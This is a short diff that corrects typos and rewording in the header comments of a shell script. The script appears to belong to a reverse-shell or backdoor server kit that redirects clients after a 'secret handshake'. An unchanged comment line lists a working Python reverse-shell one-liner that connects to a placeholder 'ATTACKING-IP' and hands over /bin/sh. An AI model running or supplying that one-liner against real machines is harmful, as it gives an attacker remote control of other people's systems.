@@ -11,7 +11,7 @@
 #   Python:
 #       python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 #
-#   More can be found online, depending on the target OS distribution.
+#   More can be found online, depending on the target OS and distribution of the server.
 #
 # Servers:
 #   HTTP:
@@ -33,10 +33,10 @@
 #   Anything that's not implimented yet. Feel free to contribute!
 #
 
-# The ip on a new connected client, after secert "handskare", received as an argument from server.sh
+# The ip of a new connected client, after secert "handshake", received as an argument from server.sh
 CLIENT_IP=$1
 
-# The port that the client should be redirected to if local iptables (or supported alternative) is installed.
+# The port that the client should be redirected to, if iptables (or supported alternative) is installed on the server.
 # If iptables isn't installed.
 REAL_SERVICE_PORT=$2
 
